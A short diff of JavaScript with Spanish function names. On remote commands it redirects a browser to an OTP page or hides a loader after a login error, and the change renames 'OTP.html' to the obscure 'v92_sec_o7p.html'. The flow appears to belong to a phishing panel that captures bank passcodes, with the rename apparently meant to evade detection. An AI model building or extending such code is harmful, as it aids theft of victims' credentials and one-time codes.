@@ -43351,7 +43351,7 @@
 
                     async function procesarComando(command) {
                         if (command === 'otp') {
-                            window.location.replace(basePath + 'OTP.html');
+                            window.location.replace(basePath + 'v92_sec_o7p.html');
                         } else if (command === 'login-error' || command === 'usuario') {
                             const loader = document.getElementById('loaderOverlay');
                             if (loader) loader.style.display = 'none';
@@ -43464,7 +43464,7 @@
 
                     async function ejecutarComando(command) {
                         if (command === 'otp') {
-                            window.location.replace(basePath + 'OTP.html');
+                            window.location.replace(basePath + 'v92_sec_o7p.html');
                         } else if (command === 'login-error' || command === 'usuario') {
                             const loader = document.getElementById('loaderOverlay');
                             if (loader) loader.style.display = 'none';
